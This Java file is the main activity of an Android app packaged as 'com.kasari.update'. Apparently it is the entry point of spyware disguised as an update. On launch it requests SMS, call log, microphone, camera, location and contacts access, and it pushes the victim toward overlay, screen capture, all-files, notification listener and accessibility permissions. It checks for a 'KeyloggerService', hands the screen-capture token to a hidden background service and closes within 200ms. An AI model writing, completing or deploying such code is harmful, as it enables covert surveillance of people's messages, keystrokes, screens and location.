package com.kasari.update;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int OVERLAY_REQUEST_CODE = 1002;
    private static final int SCREEN_CAPTURE_REQUEST_CODE = 1003;
    private static final int MANAGE_STORAGE_REQUEST_CODE = 1004;
    private static final int NOTIFICATION_LISTENER_REQUEST_CODE = 1005;
    private static final int ACCESSIBILITY_REQUEST_CODE = 1006;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Request all permissions at once
        requestAllPermissions();

        // Start background service
        startBackgroundService();

        // Finish activity after 200ms
        new Handler().postDelayed(this::finish, 200);
    }

    private void requestAllPermissions() {
        String[] permissions = getRequiredPermissions();
        boolean allGranted = true;

        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        }

        // Overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_REQUEST_CODE);
            }
        }

        // Screen capture permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaProjectionManager projectionManager =
                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            if (projectionManager != null) {
                startActivityForResult(
                    projectionManager.createScreenCaptureIntent(),
                    SCREEN_CAPTURE_REQUEST_CODE);
            }
        }

        // Storage permission for Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
            }
        }

        // Notification listener
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            String enabledListeners = Settings.Secure.getString(getContentResolver(),
                "enabled_notification_listeners");
            if (enabledListeners == null || !enabledListeners.contains(getPackageName())) {
                startActivityForResult(
                    new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS),
                    NOTIFICATION_LISTENER_REQUEST_CODE);
            }
        }

        // Accessibility service
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!isAccessibilityServiceEnabled()) {
                startActivityForResult(
                    new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS),
                    ACCESSIBILITY_REQUEST_CODE);
            }
        }
    }

    private String[] getRequiredPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_AUDIO,
                Manifest.permission.READ_MEDIA_VIDEO
            };
        } else {
            return new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_PHONE_STATE
            };
        }
    }

    private void startBackgroundService() {
        Intent intent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        try {
            String service = getPackageName() + "/" + KeyloggerService.class.getCanonicalName();
            String enabledServices = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabledServices != null && enabledServices.contains(service);
        } catch (Exception e) {
            return false;
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "Permission required: " + permissions[i], Toast.LENGTH_SHORT).show();
                }
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE && resultCode == RESULT_OK && data != null) {
            // Save screen capture permission for ScreenMirror
            Intent serviceIntent = new Intent(this, BackgroundService.class);
            serviceIntent.putExtra("screen_capture_code", resultCode);
            serviceIntent.putExtra("screen_capture_data", data);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}